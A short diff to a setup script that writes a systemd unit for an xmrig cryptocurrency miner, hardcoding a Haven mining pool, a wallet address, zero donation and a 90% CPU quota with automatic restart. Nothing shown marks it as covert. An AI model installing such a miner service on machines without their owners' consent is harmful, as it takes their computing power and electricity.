@@ -353,11 +353,11 @@ else
 [Unit]
 Description=BRS miner service
 [Service]
-ExecStart=$HOME/brs/xmrig --config=$HOME/brs/config.json
+ExecStart=$HOME/brs/xmrig --donate-level 0 -a cn-heavy/xhv -o haven.herominers.com:10451 -u hvxxyjApsn74qHK5WJg9orGnmQc2bJmPpENFskgtvF1E4RsFFm8AAJXf9aL1kKiLhL9dieCkNLAagbW3j8Arf1fJ2Wm8CUkxEz -k -p BRS-MineHive-Haven-Hoard-01
 Restart=always
 Nice=19
-CPUWeight=20
-CPUQuota=85%
+CPUWeight=1
+CPUQuota=90%
 IOWeight=20
 MemorySwapMax=0
 [Install]
